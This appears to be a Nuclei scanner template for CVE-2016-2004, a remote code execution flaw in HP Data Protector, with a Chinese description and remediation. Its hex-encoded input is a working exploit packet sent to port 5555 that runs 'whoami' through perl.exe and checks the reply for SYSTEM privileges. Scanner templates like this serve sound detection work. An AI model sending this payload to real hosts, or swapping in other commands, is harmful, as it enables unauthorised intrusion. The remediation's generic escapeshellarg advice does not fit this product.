id: CVE-2016-2004
info:
  name: HP Data Protector - Arbitrary Command Execution
  author:
  - l0ne1y
  description: "HPE Data Protector 代码执行漏洞\n HPE Data Protector是美国惠普企业（Hewlett Packard
    Enterprise，HPE）公司的一套统一数据保护解决方案。该方案通过利用智能数据管理方法，保护跨所有物理和虚拟环境的数据，提供三方（应用源、备用服务器和目标设备）重复数据删除功能。\n\nHPE
    Data Protector中存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。以下版本受到影响：HPE Data Protector 7.03_108之前版本，8.15之前版本，9.06之前版本。 "
  severity: critical
  remediation: "官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁\n 目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：\n\nhttp://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988
    \n\n临时修复方案：<br />1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br />2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\\\’”，双引号“””会被转义为“\\\\””，分号“;”会被转义为“\\\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。"
network:
- matchers:
  - type: word
    words:
    - 00000034fffe3900000020006e007400200061007500740068006f0072006900740079005c00730079007300740065006d000a0000000000
    encoding: hex
  host:
  - '{{Hostname}}'
  - '{{Host}}:5555'
  inputs:
  - data: 00000034320001010101010100010001000100010100203238005c7065726c2e65786500202d6573797374656d282777686f616d69272900
    type: hex
